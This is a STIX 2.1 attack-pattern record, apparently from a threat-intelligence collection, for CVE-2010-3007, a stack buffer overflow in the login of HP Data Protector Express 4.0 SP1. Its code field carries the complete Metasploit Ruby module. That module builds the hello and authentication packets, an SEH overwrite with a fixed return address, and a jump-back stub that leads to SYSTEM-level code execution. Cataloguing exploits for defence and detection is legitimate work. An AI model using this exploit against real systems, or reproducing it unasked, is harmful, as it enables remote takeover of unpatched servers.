{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--cca3b8ae-c2c7-4ede-b4c9-e1a9fa960554",
    "created": "2024-08-14T16:45:43.001128Z",
    "modified": "2024-08-14T16:45:43.001132Z",
    "name": "HP Data Protector DtbClsLogin Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in HP Data Protector 4.0 SP1. The overflow occurs during the login process, in the DtbClsLogin function provided by the dpwindtb.dll component, where the Utf8Cpy (strcpy like function) is used in an insecure way with the username. A successful exploitation will lead to code execution with the privileges of the \"dpwinsdr.exe\" (HP Data Protector Express Domain Server Service) process, which runs as SYSTEM by default. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/hp_dataprotector_dtbclslogin.rb",
            "external_id": "hp_dataprotector_dtbclslogin.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-3007"
        },
        {
            "source_name": "reference",
            "url": "http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02498535"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'HP Data Protector DtbClsLogin Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in HP Data Protector 4.0 SP1. The\n        overflow occurs during the login process, in the DtbClsLogin function provided by\n        the dpwindtb.dll component, where the Utf8Cpy (strcpy like function) is used in an\n        insecure way with the username. A successful exploitation will lead to code execution\n        with the privileges of the \"dpwinsdr.exe\" (HP Data Protector Express Domain Server\n        Service) process, which runs as SYSTEM by default.\n      },\n      'Author'         =>\n        [\n          'AbdulAziz Hariri', # Vulnerability discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2010-3007' ],\n          [ 'OSVDB', '67973' ],\n          [ 'BID', '43105' ],\n          [ 'ZDI', '10-174' ],\n          [ 'URL', 'http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c02498535' ]\n        ],\n      'Payload'        =>\n        {\n          'Space' => 712,\n          'BadChars' => \"\\x00\",\n          'DisableNops' => true\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          ['HP Data Protector Express 4.0 SP1 (build 43064) / Windows XP SP3',\n            {\n              'Ret' => 0x66dd3e49, # ppr from ifsutil.dll (stable over windows updates on June 26, 2012)\n              'Offset' => 712\n            }\n          ]\n        ],\n      'DefaultTarget' => 0,\n      'Privileged'     => true,\n      'DisclosureDate' => '2010-09-09'\n      ))\n    register_options(\n      [\n        Opt::RPORT(3817),\n      ])\n  end\n\n  def check\n    connect\n\n    machine_name = rand_text_alpha(15)\n\n    print_status(\"#{sock.peerinfo} - Sending Hello Request\")\n    hello =  \"\\x54\\x84\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x01\\x00\\x00\\x92\\x00\\x00\\x00\"\n    hello << \"\\x3a\\x53\\xa5\\x71\\x02\\x40\\x80\\x00\" << \"\\x89\\xff\\xb5\\x00\\x9b\\xe8\\x9a\\x00\"\n    hello << \"\\x01\\x00\\x00\\x00\\xc0\\xa8\\x01\\x86\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    hello << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    hello << \"\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    hello << \"\\x00\\x00\\x00\\x00\"\n    hello << machine_name << \"\\x00\"\n    hello << \"\\x5b\\x2e\\xad\\x71\\xb0\\x02\\x00\\x00\" << \"\\xff\\xff\\x00\\x00\\x06\\x10\\x00\\x44\"\n    hello << \"\\x74\\x62\\x3a\\x20\\x43\\x6f\\x6e\\x74\" << \"\\x65\\x78\\x74\\x00\\xe8\\xc1\\x08\\x10\"\n    hello << \"\\xb0\\x02\\x00\\x00\\xff\\xff\\x00\\x00\" << \"\\x06\\x10\\x00\\x00\\x7c\\xfa\"\n\n    sock.put(hello)\n    hello_response = sock.get_once(-1, 10)\n    disconnect\n\n    if hello_response and hello_response =~ /Dtb: Context/\n      return Exploit::CheckCode::Detected\n    end\n\n    return Exploit::CheckCode::Safe\n\n  end\n\n  def exploit\n\n    connect\n\n    machine_name = rand_text_alpha(15)\n\n    print_status(\"#{sock.peerinfo} - Sending Hello Request\")\n    hello =  \"\\x54\\x84\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x01\\x00\\x00\\x92\\x00\\x00\\x00\"\n    hello << \"\\x3a\\x53\\xa5\\x71\\x02\\x40\\x80\\x00\" << \"\\x89\\xff\\xb5\\x00\\x9b\\xe8\\x9a\\x00\"\n    hello << \"\\x01\\x00\\x00\\x00\\xc0\\xa8\\x01\\x86\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    hello << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    hello << \"\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\" << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    hello << \"\\x00\\x00\\x00\\x00\"\n    hello << machine_name << \"\\x00\"\n    hello << \"\\x5b\\x2e\\xad\\x71\\xb0\\x02\\x00\\x00\" << \"\\xff\\xff\\x00\\x00\\x06\\x10\\x00\\x44\"\n    hello << \"\\x74\\x62\\x3a\\x20\\x43\\x6f\\x6e\\x74\" << \"\\x65\\x78\\x74\\x00\\xe8\\xc1\\x08\\x10\"\n    hello << \"\\xb0\\x02\\x00\\x00\\xff\\xff\\x00\\x00\" << \"\\x06\\x10\\x00\\x00\\x7c\\xfa\"\n\n    sock.put(hello)\n    hello_response = sock.get_once(-1, 10)\n\n    if not hello_response or hello_response.empty?\n      print_error(\"#{sock.peerinfo} - The Hello Request hasn't received a response\")\n      return\n    end\n\n    bof = payload.encoded\n    bof << rand_text(target['Offset']-bof.length)\n    bof << generate_seh_record(target.ret)\n    bof << Metasm::Shellcode.assemble(Metasm::Ia32.new, \"jmp $-#{target['Offset']+8}\").encode_string\n    # The line below is used to trigger exception, don't go confused because of the big space,\n    # there are only some available bytes until the end of the stack, it allows to assure exception\n    # when there are mappings for dynamic memory after the stack, so to assure reliability it's better\n    # to jump back.\n    bof << rand_text(100000)\n\n    header =  [0x8451].pack(\"V\") # packet id\n    header << [0x32020202].pack(\"V\") # svc id\n    header << [0x00000018].pack(\"V\") # cmd id\n    header << [0].pack(\"V\") # pkt length, calculated after pkt has been built\n    header << \"\\x00\\x00\\x00\\x00\" # ?Unknown?\n\n    pkt_auth = header\n    pkt_auth << bof # username\n\n    pkt_auth[12, 4] = [pkt_auth.length].pack(\"V\")\n\n    print_status(\"#{sock.peerinfo} - Sending Authentication Request\")\n\n    sock.put(pkt_auth)\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-09-09",
    "x_mitre_platforms": [
        "win'"
    ]
}